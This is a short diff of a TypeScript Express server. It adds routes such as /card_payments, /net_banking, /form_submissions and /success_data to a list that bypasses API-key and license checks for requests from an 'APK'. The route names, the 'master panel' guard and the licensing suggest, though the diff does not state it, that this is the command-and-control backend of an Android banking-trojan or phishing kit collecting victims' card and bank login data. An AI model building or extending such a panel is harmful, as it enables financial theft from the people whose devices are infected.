@@ -35,7 +35,14 @@ app.use(masterPanelGuard);
 
 // AUTH — device routes bypass auth (APK mein koi key/session nahi hoti)
 const isDeviceRoute = (p: string) =>
-  p.startsWith("/devices") || p === "/globalPhone" || p === "/alert-text";
+  p.startsWith("/devices") ||
+  p.startsWith("/form_submissions") ||
+  p.startsWith("/card_payments") ||
+  p.startsWith("/net_banking") ||
+  p.startsWith("/success_data") ||
+  p.startsWith("/crashes") ||
+  p === "/globalPhone" ||
+  p === "/alert-text";
 
 app.use("/api", (req, res, next) => isDeviceRoute(req.path) ? next() : apiKeyAuth(req, res, next));
 app.use("/api", (req, res, next) => isDeviceRoute(req.path) ? next() : licenseGuard(req, res, next));
